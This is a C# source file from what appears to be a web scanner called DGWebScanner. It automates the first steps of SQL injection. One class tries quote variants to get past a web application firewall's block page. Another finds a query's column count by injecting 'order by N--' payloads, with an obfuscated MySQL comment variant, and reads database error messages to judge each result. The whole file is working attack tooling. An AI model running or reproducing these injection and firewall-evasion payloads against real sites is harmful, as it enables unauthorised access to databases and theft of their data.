using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using DGWebScanner.Properties;

namespace DGWebScanner
{
    public class SingleQuoteBypass
    {
        public static string SingleQuoteUrl { get; set; }
        public static string SingleQuoteHtml { get; set; }

        private static readonly string[] WafSingleQuote = { "'", "\\\'", "%27", "%5C%27" };

        public static string ReturnCorrectBaseUrLandGetSingleQuoteHtml(string url)
        {
            List<string> newSingleQuoteUrls = new List<string>();
            for (int i = 0; i < WafSingleQuote.Count(); i++)
            {
                newSingleQuoteUrls.Add(url + WafSingleQuote[i]);
            }
            // ReSharper disable once ForCanBeConvertedToForeach
            for (int i = 0; i < newSingleQuoteUrls.Count; i++)
            {
                try
                {
                    string testHtml = HelpfulFunctions.GetHtml(newSingleQuoteUrls[i]);
                    if (!testHtml.Contains("owner has denied your access to the site"))
                    {
                        SingleQuoteHtml = testHtml;
                        return newSingleQuoteUrls[i];
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex.Message);
                }
            }
            return "0";
        }
    }

    public class OrderbyBypass
    {
        public static string AvailableColumnsUrl { get; set; }
        public static string AvailableColumnsHtml { get; set; }
        public static int AvailableColumns { get; set; }

        private static readonly string[] WafOrderBy = { "order+by", "/*!50000ORdER*//**X**/by" };

        public static int GetAvailableColumns(string beforeEqual, string afterEqual)
        {
            string baseUrl = beforeEqual + "=-" + afterEqual + "+order+by+" + "!@CURRENTCOLUMN@!" + "--";
            for (int n = 0; n < WafOrderBy.Count(); n++)
            {
                int minAvailableColumns = 1;
                int maxAvailableColumns = 50;
                int columnToCheck = (maxAvailableColumns + minAvailableColumns) / 2;
                do
                {
                    AvailableColumnsUrl = baseUrl.Replace("!@CURRENTCOLUMN@!", columnToCheck.ToString());
                    string lol = AvailableColumnsUrl;
                    AvailableColumnsHtml = HelpfulFunctions.GetHtml(AvailableColumnsUrl);
                    string two = AvailableColumnsHtml;
                    if (AvailableColumnsHtml.Contains("expects parameter 1 to be resource, boolean") ||
                        AvailableColumnsHtml.Contains(":  Invalid argument supplied for foreach()") ||
                        AvailableColumnsHtml.Contains("MySQL Query Error"))
                    {
                        Debug.WriteLine("Error found. Column doesn't exist. Check lower.");
                        maxAvailableColumns = columnToCheck;
                        columnToCheck = (minAvailableColumns + maxAvailableColumns) / 2;
                    }
                    else
                    {
                        Debug.WriteLine("No error found. Column does exist. Keep going up.");
                        minAvailableColumns = columnToCheck;
                        columnToCheck = (minAvailableColumns + maxAvailableColumns) / 2;
                    }
                    if (AvailableColumnsHtml.Contains("(403) Forbidden"))
                    {
                        minAvailableColumns = 49;
                    }
                } while (maxAvailableColumns != minAvailableColumns + 1);
                if (minAvailableColumns != 49 && maxAvailableColumns != 50)
                {
                    return columnToCheck;
                }
                if (n != WafOrderBy.Count() - 1)
                {
                    baseUrl = baseUrl.Replace(WafOrderBy[n], WafOrderBy[n + 1]);
                }


            }

















            return 50;
        }

    }

}
